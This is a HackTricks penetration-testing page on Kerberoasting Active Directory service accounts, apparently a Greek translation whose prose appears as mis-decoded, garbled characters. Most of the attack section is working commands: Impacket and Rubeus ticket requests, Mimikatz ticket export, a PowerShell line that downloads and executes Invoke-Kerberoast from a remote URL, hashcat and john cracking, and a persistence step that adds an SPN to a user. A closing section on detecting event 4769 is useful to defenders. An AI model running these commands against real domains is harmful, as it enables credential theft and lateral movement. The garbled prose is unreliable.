# Kerberoast

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Î§ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î®ÏƒÏ„Îµ Ï„Î¿ [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) Î³Î¹Î± Î½Î± Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î®ÏƒÎµÏ„Îµ ÎµÏÎºÎ¿Î»Î± ÎºÎ±Î¹ Î½Î± **Î±Ï…Ï„Î¿Î¼Î±Ï„Î¿Ï€Î¿Î¹Î®ÏƒÎµÏ„Îµ ÏÎ¿Î­Ï‚ ÎµÏÎ³Î±ÏƒÎ¯Î±Ï‚** Î¼Îµ Ï„Î± Ï€Î¹Î¿ Ï€ÏÎ¿Î·Î³Î¼Î­Î½Î± ÎµÏÎ³Î±Î»ÎµÎ¯Î± Ï„Î·Ï‚ ÎºÎ¿Î¹Î½ÏŒÏ„Î·Ï„Î±Ï‚.\
Î‘Ï€Î¿ÎºÏ„Î®ÏƒÏ„Îµ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ· ÏƒÎ®Î¼ÎµÏÎ±:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><strong>ÎœÎ¬Î¸ÎµÏ„Îµ Ï„Î¿ Ï‡Î¬ÎºÎ¹Î½Î³Îº ÏƒÏ„Î¿ AWS Î±Ï€ÏŒ Ï„Î¿ Î¼Î·Î´Î­Î½ Î¼Î­Ï‡ÏÎ¹ Ï„Î¿Î½ Î®ÏÏ‰Î± Î¼Îµ Ï„Î¿</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Î†Î»Î»Î¿Î¹ Ï„ÏÏŒÏ€Î¿Î¹ Ï…Ï€Î¿ÏƒÏ„Î®ÏÎ¹Î¾Î·Ï‚ Ï„Î¿Ï… HackTricks:

* Î‘Î½ Î¸Î­Î»ÎµÏ„Îµ Î½Î± Î´ÎµÎ¯Ï„Îµ Ï„Î·Î½ **ÎµÏ„Î±Î¹ÏÎµÎ¯Î± ÏƒÎ±Ï‚ Î´Î¹Î±Ï†Î·Î¼Î¹ÏƒÎ¼Î­Î½Î· ÏƒÏ„Î¿ HackTricks** Î® Î½Î± **ÎºÎ±Ï„ÎµÎ²Î¬ÏƒÎµÏ„Îµ Ï„Î¿ HackTricks ÏƒÎµ Î¼Î¿ÏÏ†Î® PDF** ÎµÎ»Î­Î³Î¾Ï„Îµ Ï„Î± [**Î£Î§Î•Î”Î™Î‘ Î£Î¥ÎÎ”Î¡ÎŸÎœÎ—Î£**](https://github.com/sponsors/carlospolop)!
* Î‘Ï€Î¿ÎºÏ„Î®ÏƒÏ„Îµ Ï„Î¿ [**ÎµÏ€Î¯ÏƒÎ·Î¼Î¿ PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Î‘Î½Î±ÎºÎ±Î»ÏÏˆÏ„Îµ [**Ï„Î·Î½ ÎŸÎ¹ÎºÎ¿Î³Î­Î½ÎµÎ¹Î± PEASS**](https://opensea.io/collection/the-peass-family), Ï„Î· ÏƒÏ…Î»Î»Î¿Î³Î® Î¼Î±Ï‚ Î±Ï€ÏŒ Î±Ï€Î¿ÎºÎ»ÎµÎ¹ÏƒÏ„Î¹ÎºÎ¬ [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Î•Î³Î³ÏÎ±Ï†ÎµÎ¯Ï„Îµ** ÏƒÏ„Î·Î½ ğŸ’¬ [**Î¿Î¼Î¬Î´Î± Discord**](https://discord.gg/hRep4RUj7f) Î® ÏƒÏ„Î·Î½ [**Î¿Î¼Î¬Î´Î± Ï„Î·Î»ÎµÎ³ÏÎ±Ï†Î®Î¼Î±Ï„Î¿Ï‚**](https://t.me/peass) Î® **Î±ÎºÎ¿Î»Î¿Ï…Î¸Î®ÏƒÏ„Îµ** Î¼Î±Ï‚ ÏƒÏ„Î¿ **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **ÎœÎ¿Î¹ÏÎ±ÏƒÏ„ÎµÎ¯Ï„Îµ Ï„Î± Ï‡Î¬ÎºÎ¹Î½Î³Îº ÎºÏŒÎ»Ï€Î± ÏƒÎ±Ï‚ Ï…Ï€Î¿Î²Î¬Î»Î»Î¿Î½Ï„Î±Ï‚ PRs** ÏƒÏ„Î± Î±Ï€Î¿Î¸ÎµÏ„Î®ÏÎ¹Î± Ï„Î¿Ï… [**HackTricks**](https://github.com/carlospolop/hacktricks) ÎºÎ±Î¹ Ï„Î¿Ï… [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Kerberoast

Î¤Î¿ Kerberoasting ÎµÏ€Î¹ÎºÎµÎ½Ï„ÏÏÎ½ÎµÏ„Î±Î¹ ÏƒÏ„Î·Î½ Î±Ï€ÏŒÎºÏ„Î·ÏƒÎ· **TGS ÎµÎ¹ÏƒÎ¹Ï„Î·ÏÎ¯Ï‰Î½**, ÎµÎ¹Î´Î¹ÎºÎ¬ Î±Ï…Ï„ÏÎ½ Ï€Î¿Ï… ÏƒÏ‡ÎµÏ„Î¯Î¶Î¿Î½Ï„Î±Î¹ Î¼Îµ Ï…Ï€Î·ÏÎµÏƒÎ¯ÎµÏ‚ Ï€Î¿Ï… Î»ÎµÎ¹Ï„Î¿Ï…ÏÎ³Î¿ÏÎ½ Ï…Ï€ÏŒ **Î»Î¿Î³Î±ÏÎ¹Î±ÏƒÎ¼Î¿ÏÏ‚ Ï‡ÏÎ·ÏƒÏ„ÏÎ½** ÏƒÏ„Î¿ **Active Directory (AD)**, ÎµÎ¾Î±Î¹ÏÏÎ½Ï„Î±Ï‚ Ï„Î¿Ï…Ï‚ **Î»Î¿Î³Î±ÏÎ¹Î±ÏƒÎ¼Î¿ÏÏ‚ Ï…Ï€Î¿Î»Î¿Î³Î¹ÏƒÏ„ÏÎ½**. Î— ÎºÏÏ…Ï€Ï„Î¿Î³ÏÎ¬Ï†Î·ÏƒÎ· Î±Ï…Ï„ÏÎ½ Ï„Ï‰Î½ ÎµÎ¹ÏƒÎ¹Ï„Î·ÏÎ¯Ï‰Î½ Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÎµÎ¯ ÎºÎ»ÎµÎ¹Î´Î¹Î¬ Ï€Î¿Ï… Ï€ÏÎ¿Î­ÏÏ‡Î¿Î½Ï„Î±Î¹ Î±Ï€ÏŒ **ÎºÏ‰Î´Î¹ÎºÎ¿ÏÏ‚ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ·Ï‚ Ï‡ÏÎ·ÏƒÏ„ÏÎ½**, ÎµÏ€Î¹Ï„ÏÎ­Ï€Î¿Î½Ï„Î±Ï‚ Ï„Î· Î´Ï…Î½Î±Ï„ÏŒÏ„Î·Ï„Î± **Î±Ï€Î¿ÎºÏÏ…Ï€Ï„Î¿Î³ÏÎ¬Ï†Î·ÏƒÎ·Ï‚ ÎµÎ¾Ï‰ ÏƒÏÎ½Î´ÎµÏƒÎ·Ï‚**. Î— Ï‡ÏÎ®ÏƒÎ· ÎµÎ½ÏŒÏ‚ Î»Î¿Î³Î±ÏÎ¹Î±ÏƒÎ¼Î¿Ï Ï‡ÏÎ®ÏƒÏ„Î· Ï‰Ï‚ Ï…Ï€Î·ÏÎµÏƒÎ¯Î± Ï…Ï€Î¿Î´ÎµÎ¹ÎºÎ½ÏÎµÏ„Î±Î¹ Î±Ï€ÏŒ Î¼Î¹Î± Î¼Î· ÎºÎµÎ½Î® Î¹Î´Î¹ÏŒÏ„Î·Ï„Î± **"ServicePrincipalName"**.

Î“Î¹Î± Ï„Î·Î½ ÎµÎºÏ„Î­Î»ÎµÏƒÎ· Ï„Î¿Ï… **Kerberoasting**, ÎµÎ¯Î½Î±Î¹ Î±Ï€Î±ÏÎ±Î¯Ï„Î·Ï„Î¿Ï‚ Î­Î½Î±Ï‚ Î»Î¿Î³Î±ÏÎ¹Î±ÏƒÎ¼ÏŒÏ‚ Ï„Î¿Î¼Î­Î± Ï€Î¿Ï… Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Î¶Î·Ï„Î®ÏƒÎµÎ¹ **TGS ÎµÎ¹ÏƒÎ¹Ï„Î®ÏÎ¹Î±**Â· Ï‰ÏƒÏ„ÏŒÏƒÎ¿, Î±Ï…Ï„Î® Î· Î´Î¹Î±Î´Î¹ÎºÎ±ÏƒÎ¯Î± Î´ÎµÎ½ Î±Ï€Î±Î¹Ï„ÎµÎ¯ **ÎµÎ¹Î´Î¹ÎºÎ¬ Ï€ÏÎ¿Î½ÏŒÎ¼Î¹Î±**, ÎºÎ±Î¸Î¹ÏƒÏ„ÏÎ½Ï„Î±Ï‚ Ï„Î·Î½ Ï€ÏÎ¿ÏƒÎ²Î¬ÏƒÎ¹Î¼Î· ÏƒÎµ Î¿Ï€Î¿Î¹Î¿Î½Î´Î®Ï€Î¿Ï„Îµ Î¼Îµ **Î­Î³ÎºÏ…ÏÎ± Î´Î¹Î±Ï€Î¹ÏƒÏ„ÎµÏ…Ï„Î®ÏÎ¹Î± Ï„Î¿Î¼Î­Î±**.

### ÎšÏÏÎ¹Î± Î£Î·Î¼ÎµÎ¯Î±:

* Î¤Î¿ **Kerberoasting** ÏƒÏ„Î¿Ï‡ÎµÏÎµÎ¹ ÏƒÎµ **TGS ÎµÎ¹ÏƒÎ¹Ï„Î®ÏÎ¹Î±** Î³Î¹Î± **Ï…Ï€Î·ÏÎµÏƒÎ¯ÎµÏ‚ Î»Î¿Î³Î±ÏÎ¹Î±ÏƒÎ¼ÏÎ½ Ï‡ÏÎ·ÏƒÏ„ÏÎ½** ÎµÎ½Ï„ÏŒÏ‚ Ï„Î¿Ï… **AD**.
* Î¤Î± ÎµÎ¹ÏƒÎ¹Ï„Î®ÏÎ¹Î± Ï€Î¿Ï… ÎºÏÏ…Ï€Ï„Î¿Î³ÏÎ±Ï†Î¿ÏÎ½Ï„Î±Î¹ Î¼Îµ ÎºÎ»ÎµÎ¹Î´Î¹Î¬ Î±Ï€ÏŒ **ÎºÏ‰Î´Î¹ÎºÎ¿ÏÏ‚ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ·Ï‚ Ï‡ÏÎ·ÏƒÏ„ÏÎ½** Î¼Ï€Î¿ÏÎ¿ÏÎ½ Î½Î± **Î±Ï€Î¿ÎºÏÏ…Ï€Ï„Î¿Î³ÏÎ±Ï†Î·Î¸Î¿ÏÎ½ ÎµÎ¾Ï‰ ÏƒÏÎ½Î´ÎµÏƒÎ·Ï‚**.
* ÎœÎ¹Î± Ï…Ï€Î·ÏÎµÏƒÎ¯Î± Î±Î½Î±Î³Î½Ï‰ÏÎ¯Î¶ÎµÏ„Î±Î¹ Î±Ï€ÏŒ Î­Î½Î± **ServicePrincipalName** Ï€Î¿Ï… Î´ÎµÎ½ ÎµÎ¯Î½Î±Î¹ ÎºÎµÎ½ÏŒ.
* Î”ÎµÎ½ Î±Ï€Î±Î¹Ï„Î¿ÏÎ½Ï„Î±Î¹ **ÎµÎ¹Î´Î¹ÎºÎ¬ Ï€ÏÎ¿Î½ÏŒÎ¼Î¹Î±**, Î¼ÏŒÎ½Î¿ **Î­Î³ÎºÏ…ÏÎ± Î´Î¹Î±Ï€Î¹ÏƒÏ„ÎµÏ…Ï„Î®ÏÎ¹Î± Ï„Î¿Î¼Î­Î±**.

### **Î•Ï€Î¯Î¸ÎµÏƒÎ·**

{% hint style="warning" %}
Î¤Î± **ÎµÏÎ³Î±Î»ÎµÎ¯Î± Kerberoasting** ÏƒÏ…Î½Î®Î¸Ï‰Ï‚ Î¶Î·Ï„Î¿ÏÎ½ **`RC4 ÎºÏÏ…Ï€Ï„Î¿Î³ÏÎ¬Ï†Î·ÏƒÎ·`** ÎºÎ±Ï„Î¬ Ï„Î·Î½ ÎµÎºÏ„Î­Î»ÎµÏƒÎ· Ï„Î·Ï‚ ÎµÏ€Î¯Î¸ÎµÏƒÎ·Ï‚ ÎºÎ±Î¹ Ï„Î·Î½ Î­Î½Î±ÏÎ¾Î· Î±Î¹Ï„Î·Î¼Î¬Ï„Ï‰Î½ TGS-REQ. Î‘Ï…Ï„ÏŒ ÏƒÏ…Î¼Î²Î±Î¯Î½ÎµÎ¹ ÎµÏ€ÎµÎ¹Î´Î® Ï„Î¿ **RC4 ÎµÎ¯Î½Î±Î¹** [**Î±ÏƒÎ¸ÎµÎ½Î­ÏƒÏ„ÎµÏÎ¿**](https://www.stigviewer.com/stig/windows\_10/2017-04-28/finding/V-63795) ÎºÎ±Î¹ Ï€Î¹Î¿ ÎµÏÎºÎ¿Î»Î¿ Î½Î± Î±Ï€Î¿ÎºÏÏ…Ï€Ï„Î¿Î³ÏÎ±Ï†Î·Î¸ÎµÎ¯ ÎµÎ¾Ï‰ ÏƒÏÎ½Î´ÎµÏƒÎ·Ï‚ Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÏÎ½Ï„Î±Ï‚ ÎµÏÎ³Î±Î»ÎµÎ¯Î± ÏŒÏ€Ï‰Ï‚ Ï„Î¿ Hashcat Î±Ï€ÏŒ Î¬Î»Î»Î¿Ï…Ï‚ Î±Î»Î³ÏŒÏÎ¹Î¸Î¼Î¿Ï…Ï‚ ÎºÏÏ…Ï€Ï„Î¿Î³ÏÎ¬Ï†Î·ÏƒÎ·Ï‚ ÏŒÏ€Ï‰Ï‚ Ï„Î¿ AES-128 ÎºÎ±Î¹ Ï„Î¿ AES-256.\
ÎŸÎ¹ ÎºÎ±Ï„Î±ÎºÎµÏÎ¼Î±Ï„Î¹ÏƒÎ¼Î¿Î¯ RC4 (Ï„ÏÏ€Î¿Ï‚ 23) Î¾ÎµÎºÎ¹Î½Î¿ÏÎ½ Î¼Îµ **`$krb5tgs$23$*`** ÎµÎ½Ï Î¿Î¹ AES-256 (Ï„ÏÏ€Î¿Ï‚ 18) Î¾ÎµÎºÎ¹Î½Î¿ÏÎ½ Î¼Îµ **`$krb5tgs$18$*`**`.
{% endhint %}

#### **Linux**
```bash
# Metasploit framework
msf> use auxiliary/gather/get_user_spns
# Impacket
GetUserSPNs.py -request -dc-ip <DC_IP> <DOMAIN.FULL>/<USERNAME> -outputfile hashes.kerberoast # Password will be prompted
GetUserSPNs.py -request -dc-ip <DC_IP> -hashes <LMHASH>:<NTHASH> <DOMAIN>/<USERNAME> -outputfile hashes.kerberoast
# kerberoast: https://github.com/skelsec/kerberoast
kerberoast ldap spn 'ldap+ntlm-password://<DOMAIN.FULL>\<USERNAME>:<PASSWORD>@<DC_IP>' -o kerberoastable # 1. Enumerate kerberoastable users
kerberoast spnroast 'kerberos+password://<DOMAIN.FULL>\<USERNAME>:<PASSWORD>@<DC_IP>' -t kerberoastable_spn_users.txt -o kerberoast.hashes # 2. Dump hashes
```
Î•ÏÎ³Î±Î»ÎµÎ¯Î± Î¼Îµ Ï€Î¿Î»Î»Î±Ï€Î»Î­Ï‚ Î»ÎµÎ¹Ï„Î¿Ï…ÏÎ³Î¯ÎµÏ‚ Ï€ÎµÏÎ¹Î»Î±Î¼Î²Î¬Î½Î¿Ï…Î½ Î­Î½Î± Î±Ï€Î¿Î¸ÎµÏ„Î®ÏÎ¹Î¿ Ï‡ÏÎ·ÏƒÏ„ÏÎ½ Ï€Î¿Ï… Î¼Ï€Î¿ÏÎ¿ÏÎ½ Î½Î± Ï…Ï€Î¿ÏƒÏ„Î¿ÏÎ½ Kerberoast.
```bash
# ADenum: https://github.com/SecuProject/ADenum
adenum -d <DOMAIN.FULL> -ip <DC_IP> -u <USERNAME> -p <PASSWORD> -c
```
#### Windows

* **Î‘Ï€Î±ÏÎ¹Î¸Î¼Î®ÏƒÏ„Îµ Ï„Î¿Ï…Ï‚ Ï‡ÏÎ®ÏƒÏ„ÎµÏ‚ Ï€Î¿Ï… Î¼Ï€Î¿ÏÎ¿ÏÎ½ Î½Î± Ï…Ï€Î¿ÏƒÏ„Î¿ÏÎ½ Kerberoast**
```powershell
# Get Kerberoastable users
setspn.exe -Q */* #This is a built-in binary. Focus on user accounts
Get-NetUser -SPN | select serviceprincipalname #Powerview
.\Rubeus.exe kerberoast /stats
```
* **Î¤ÎµÏ‡Î½Î¹ÎºÎ® 1: Î–Î·Ï„Î®ÏƒÏ„Îµ TGS ÎºÎ±Î¹ Î±Î½Î±ÎºÏ„Î®ÏƒÏ„Îµ Ï„Î¿ Î±Ï€ÏŒ Ï„Î· Î¼Î½Î®Î¼Î·**
```powershell
#Get TGS in memory from a single user
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "ServicePrincipalName" #Example: MSSQLSvc/mgmt.domain.local

#Get TGSs for ALL kerberoastable accounts (PCs included, not really smart)
setspn.exe -T DOMAIN_NAME.LOCAL -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }

#List kerberos tickets in memory
klist

# Extract them from memory
Invoke-Mimikatz -Command '"kerberos::list /export"' #Export tickets to current folder

# Transform kirbi ticket to john
python2.7 kirbi2john.py sqldev.kirbi
# Transform john to hashcat
sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > sqldev_tgs_hashcat
```
* **Î¤ÎµÏ‡Î½Î¹ÎºÎ® 2: Î‘Ï…Ï„ÏŒÎ¼Î±Ï„Î± ÎµÏÎ³Î±Î»ÎµÎ¯Î±**
```bash
# Powerview: Get Kerberoast hash of a user
Request-SPNTicket -SPN "<SPN>" -Format Hashcat #Using PowerView Ex: MSSQLSvc/mgmt.domain.local
# Powerview: Get all Kerberoast hashes
Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\kerberoast.csv -NoTypeInformation

# Rubeus
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
.\Rubeus.exe kerberoast /user:svc_mssql /outfile:hashes.kerberoast #Specific user
.\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap #Get of admins

# Invoke-Kerberoast
iex (new-object Net.WebClient).DownloadString("https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1")
Invoke-Kerberoast -OutputFormat hashcat | % { $_.Hash } | Out-File -Encoding ASCII hashes.kerberoast
```
{% hint style="warning" %}
ÎŒÏ„Î±Î½ Î¶Î·Ï„ÎµÎ¯Ï„Î±Î¹ Î­Î½Î± TGS, Î´Î·Î¼Î¹Î¿Ï…ÏÎ³ÎµÎ¯Ï„Î±Î¹ Ï„Î¿ Î³ÎµÎ³Î¿Î½ÏŒÏ‚ Ï„Î¿Ï… Windows `4769 - Î–Î·Ï„Î®Î¸Î·ÎºÎµ Î­Î½Î± ÎµÎ¹ÏƒÎ¹Ï„Î®ÏÎ¹Î¿ Ï…Ï€Î·ÏÎµÏƒÎ¯Î±Ï‚ Kerberos`.
{% endhint %}

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Î§ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î®ÏƒÏ„Îµ Ï„Î¿ [**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks) Î³Î¹Î± Î½Î± Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î®ÏƒÎµÏ„Îµ ÎµÏÎºÎ¿Î»Î± ÎºÎ±Î¹ Î½Î± **Î±Ï…Ï„Î¿Î¼Î±Ï„Î¿Ï€Î¿Î¹Î®ÏƒÎµÏ„Îµ ÏÎ¿Î­Ï‚ ÎµÏÎ³Î±ÏƒÎ¯Î±Ï‚** Î¼Îµ Ï„Î± Ï€Î¹Î¿ Ï€ÏÎ¿Î·Î³Î¼Î­Î½Î± ÎµÏÎ³Î±Î»ÎµÎ¯Î± Ï„Î·Ï‚ ÎºÎ¿Î¹Î½ÏŒÏ„Î·Ï„Î±Ï‚.\
Î‘Ï€Î¿ÎºÏ„Î®ÏƒÏ„Îµ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ· ÏƒÎ®Î¼ÎµÏÎ±:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

### Î‘Ï€Î¿ÎºÏ‰Î´Î¹ÎºÎ¿Ï€Î¿Î¯Î·ÏƒÎ·
```bash
john --format=krb5tgs --wordlist=passwords_kerb.txt hashes.kerberoast
hashcat -m 13100 --force -a 0 hashes.kerberoast passwords_kerb.txt
./tgsrepcrack.py wordlist.txt 1-MSSQLSvc~sql01.medin.local~1433-MYDOMAIN.LOCAL.kirbi
```
### Î”Î¹Î±Ï„Î®ÏÎ·ÏƒÎ·

Î•Î¬Î½ Î­Ï‡ÎµÏ„Îµ **ÎµÏ€Î±ÏÎºÎ® Î´Î¹ÎºÎ±Î¹ÏÎ¼Î±Ï„Î±** Ï€Î¬Î½Ï‰ ÏƒÎµ Î­Î½Î±Î½ Ï‡ÏÎ®ÏƒÏ„Î·, Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Ï„Î¿Î½ **ÎºÎ¬Î½ÎµÏ„Îµ kerberoastable**:
```bash
Set-DomainObject -Identity <username> -Set @{serviceprincipalname='just/whateverUn1Que'} -verbose
```
ÎœÏ€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Î²ÏÎµÎ¯Ï„Îµ Ï‡ÏÎ®ÏƒÎ¹Î¼Î± **ÎµÏÎ³Î±Î»ÎµÎ¯Î±** Î³Î¹Î± ÎµÏ€Î¹Î¸Î­ÏƒÎµÎ¹Ï‚ **kerberoast** ÎµÎ´Ï: [https://github.com/nidem/kerberoast](https://github.com/nidem/kerberoast)

Î‘Î½ Î±Î½Ï„Î¹Î¼ÎµÏ„Ï‰Ï€Î¯Î¶ÎµÏ„Îµ Î±Ï…Ï„ÏŒ Ï„Î¿ **ÏƒÏ†Î¬Î»Î¼Î±** Î±Ï€ÏŒ Linux: **`Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)`** ÎµÎ¯Î½Î±Î¹ Î»ÏŒÎ³Ï‰ Ï„Î·Ï‚ Ï„Î¿Ï€Î¹ÎºÎ®Ï‚ ÏÏÎ±Ï‚ ÏƒÎ±Ï‚, Ï€ÏÎ­Ï€ÎµÎ¹ Î½Î± ÏƒÏ…Î³Ï‡ÏÎ¿Î½Î¯ÏƒÎµÏ„Îµ Ï„Î¿Î½ Ï…Ï€Î¿Î»Î¿Î³Î¹ÏƒÏ„Î® Î¼Îµ Ï„Î¿Î½ DC. Î¥Ï€Î¬ÏÏ‡Î¿Ï…Î½ Î¼ÎµÏÎ¹ÎºÎ­Ï‚ ÎµÏ€Î¹Î»Î¿Î³Î­Ï‚:

* `ntpdate <IP Ï„Î¿Ï… DC>` - Î‘Ï€Î¿ÏƒÏ…ÏÎ¼Î­Î½Î¿ Î±Ï€ÏŒ Ï„Î¿ Ubuntu 16.04
* `rdate -n <IP Ï„Î¿Ï… DC>`

### Î‘Î½Ï„Î¹Î¼ÎµÏ„ÏÏ€Î¹ÏƒÎ·

Î— ÎµÏ€Î¯Î¸ÎµÏƒÎ· Kerberoasting Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Ï€ÏÎ±Î³Î¼Î±Ï„Î¿Ï€Î¿Î¹Î·Î¸ÎµÎ¯ Î¼Îµ Ï…ÏˆÎ·Î»ÏŒ Î²Î±Î¸Î¼ÏŒ Î±ÏŒÏÎ±Ï„Î·Ï‚ Î»ÎµÎ¹Ï„Î¿Ï…ÏÎ³Î¯Î±Ï‚ Î±Î½ ÎµÎ¯Î½Î±Î¹ ÎµÎºÎ¼ÎµÏ„Î±Î»Î»ÎµÏÏƒÎ¹Î¼Î·. Î“Î¹Î± Î½Î± Î±Î½Î¹Ï‡Î½ÎµÏ…Î¸ÎµÎ¯ Î±Ï…Ï„Î® Î· Î´ÏÎ±ÏƒÏ„Î·ÏÎ¹ÏŒÏ„Î·Ï„Î±, Ï€ÏÎ­Ï€ÎµÎ¹ Î½Î± Î´Î¿Î¸ÎµÎ¯ Ï€ÏÎ¿ÏƒÎ¿Ï‡Î® ÏƒÏ„Î¿ **Security Event ID 4769**, Ï„Î¿ Î¿Ï€Î¿Î¯Î¿ Ï…Ï€Î¿Î´ÎµÎ¹ÎºÎ½ÏÎµÎ¹ ÏŒÏ„Î¹ Î­Ï‡ÎµÎ¹ Î¶Î·Ï„Î·Î¸ÎµÎ¯ Î­Î½Î± ÎµÎ¹ÏƒÎ¹Ï„Î®ÏÎ¹Î¿ Kerberos. Î©ÏƒÏ„ÏŒÏƒÎ¿, Î»ÏŒÎ³Ï‰ Ï„Î·Ï‚ Ï…ÏˆÎ·Î»Î®Ï‚ ÏƒÏ…Ï‡Î½ÏŒÏ„Î·Ï„Î±Ï‚ Î±Ï…Ï„Î¿Ï Ï„Î¿Ï… ÏƒÏ…Î¼Î²Î¬Î½Ï„Î¿Ï‚, Ï€ÏÎ­Ï€ÎµÎ¹ Î½Î± ÎµÏ†Î±ÏÎ¼Î¿ÏƒÏ„Î¿ÏÎ½ ÏƒÏ…Î³ÎºÎµÎºÏÎ¹Î¼Î­Î½Î± Ï†Î¯Î»Ï„ÏÎ± Î³Î¹Î± Î½Î± Î±Ï€Î¿Î¼Î¿Î½Ï‰Î¸Î¿ÏÎ½ ÏÏ€Î¿Ï€Ï„ÎµÏ‚ Î´ÏÎ±ÏƒÏ„Î·ÏÎ¹ÏŒÏ„Î·Ï„ÎµÏ‚:

* Î¤Î¿ ÏŒÎ½Î¿Î¼Î± Ï…Ï€Î·ÏÎµÏƒÎ¯Î±Ï‚ Î´ÎµÎ½ Ï€ÏÎ­Ï€ÎµÎ¹ Î½Î± ÎµÎ¯Î½Î±Î¹ **krbtgt**, ÎºÎ±Î¸ÏÏ‚ Î±Ï…Ï„ÏŒ ÎµÎ¯Î½Î±Î¹ Î­Î½Î± Ï†Ï…ÏƒÎ¹Î¿Î»Î¿Î³Î¹ÎºÏŒ Î±Î¯Ï„Î·Î¼Î±.
* Î¤Î± Î¿Î½ÏŒÎ¼Î±Ï„Î± Ï…Ï€Î·ÏÎµÏƒÎ¹ÏÎ½ Ï€Î¿Ï… Ï„ÎµÎ»ÎµÎ¹ÏÎ½Î¿Ï…Î½ Î¼Îµ **$** Ï€ÏÎ­Ï€ÎµÎ¹ Î½Î± ÎµÎ¾Î±Î¹ÏÎµÎ¸Î¿ÏÎ½ Î³Î¹Î± Î½Î± Î±Ï€Î¿Ï†ÎµÏ…Ï‡Î¸ÎµÎ¯ Î· ÏƒÏ…Î¼Ï€ÎµÏÎ¯Î»Î·ÏˆÎ· Î»Î¿Î³Î±ÏÎ¹Î±ÏƒÎ¼ÏÎ½ Î¼Î·Ï‡Î±Î½ÏÎ½ Ï€Î¿Ï… Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î¿ÏÎ½Ï„Î±Î¹ Î³Î¹Î± Ï…Ï€Î·ÏÎµÏƒÎ¯ÎµÏ‚.
* Î¤Î± Î±Î¹Ï„Î®Î¼Î±Ï„Î± Î±Ï€ÏŒ Î¼Î·Ï‡Î±Î½Î­Ï‚ Ï€ÏÎ­Ï€ÎµÎ¹ Î½Î± Ï†Î¹Î»Ï„ÏÎ±ÏÎ¹ÏƒÏ„Î¿ÏÎ½ Î±Ï€Î¿ÎºÎ»ÎµÎ¯Î¿Î½Ï„Î±Ï‚ Ï„Î± Î¿Î½ÏŒÎ¼Î±Ï„Î± Î»Î¿Î³Î±ÏÎ¹Î±ÏƒÎ¼ÏÎ½ Î¼Î¿ÏÏ†Î¿Ï€Î¿Î¹Î·Î¼Î­Î½Î± Ï‰Ï‚ **machine@domain**.
* Î ÏÎ­Ï€ÎµÎ¹ Î½Î± Î»Î·Ï†Î¸Î¿ÏÎ½ Ï…Ï€ÏŒÏˆÎ· Î¼ÏŒÎ½Î¿ ÎµÏ€Î¹Ï„Ï…Ï‡Î® Î±Î¹Ï„Î®Î¼Î±Ï„Î± ÎµÎ¹ÏƒÎ¹Ï„Î·ÏÎ¯Ï‰Î½, Ï€Î¿Ï… Î±Î½Î±Î³Î½Ï‰ÏÎ¯Î¶Î¿Î½Ï„Î±Î¹ Î±Ï€ÏŒ Î­Î½Î±Î½ ÎºÏ‰Î´Î¹ÎºÏŒ Î±Ï€Î¿Ï„Ï…Ï‡Î¯Î±Ï‚ **'0x0'**.
* **Î¤Î¿ Ï€Î¹Î¿ ÏƒÎ·Î¼Î±Î½Ï„Î¹ÎºÏŒ**, Î¿ Ï„ÏÏ€Î¿Ï‚ ÎºÏÏ…Ï€Ï„Î¿Î³ÏÎ¬Ï†Î·ÏƒÎ·Ï‚ Ï„Î¿Ï… ÎµÎ¹ÏƒÎ¹Ï„Î·ÏÎ¯Î¿Ï… Ï€ÏÎ­Ï€ÎµÎ¹ Î½Î± ÎµÎ¯Î½Î±Î¹ **0x17**, Î¿ Î¿Ï€Î¿Î¯Î¿Ï‚ Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÎµÎ¯Ï„Î±Î¹ ÏƒÏ…Ï‡Î½Î¬ ÏƒÎµ ÎµÏ€Î¹Î¸Î­ÏƒÎµÎ¹Ï‚ Kerberoasting.
```bash
